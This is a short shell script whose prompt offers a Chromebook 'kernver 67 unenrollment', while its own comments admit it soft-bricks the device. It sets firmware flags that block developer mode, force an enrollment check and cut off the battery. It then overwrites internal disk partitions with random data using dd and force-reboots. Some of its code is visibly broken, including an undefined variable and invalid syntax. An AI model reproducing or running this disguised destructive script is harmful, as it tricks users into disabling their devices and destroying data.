#!/bin/sh
# hey you, look at you being smart reading the code before running a script!
# this shit will soft-brick your chromebook lmao
# to fix it, you'll have to open it up, unplug and replug the battery to the PCB, plug in a charger
# then boot recovery and use a recovery image, after that you'll be fine.

read -p "Would you like to begin kernver 67 (six seven) unerololoment? (y/n)" -n 1 -r
  echo
  if [[ $REPLY !=~ ^[Yy]$ ]]; then
    exit 1
  fi

echo "starting persistence in fanxql injection..."

vpd -i RW_VPD -s block_devmode=1 >/dev/null 2>&1
vpd -i RW_VPD -s check_enrollment=1 >/dev/null 2>&1
crossystem block_devmode=1 >/dev/null 2>&1
crossystem battery_cutoff_request=1 >/dev/null 2>&1

get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}
TARGET_DEVICE=$(get_fixed_dst_drive)
device_type=$(echo "$TARGET_DEVICE" | grep -oE 'blk0|blk1||nvme|sda' | head -n 1)
  case $device_type in
  "blk0")
    intdis=/dev/mmcblk0
      intdis_prefix="p"
    break
    ;;
  "blk1")
    intdis=/dev/mmcblk1
      intdis_prefix="p"
    break
    ;;
  "nvme")
    intdis=/dev/nvme0
      intdis_prefix="n"
    break
    ;;
  "sda")
    intdis=/dev/sda
      intdis_prefix=""
    break
    ;;
  *)
    exit 1
    ;;
  esac

dd if=/dev/urandom of="$TARGET_DEVICE_P$intdis_prefix"2 >/dev/null 2>&1 # tuff!
dd if=/dev/urandom of="$TARGET_DEVICE_P$intdis_prefix"4 >/dev/null 2>&1
echo "Done!" 
sleep 4
clear
cat "$PAYLOAD_DIR/whale.txt"
sleep 0.3
reboot -f
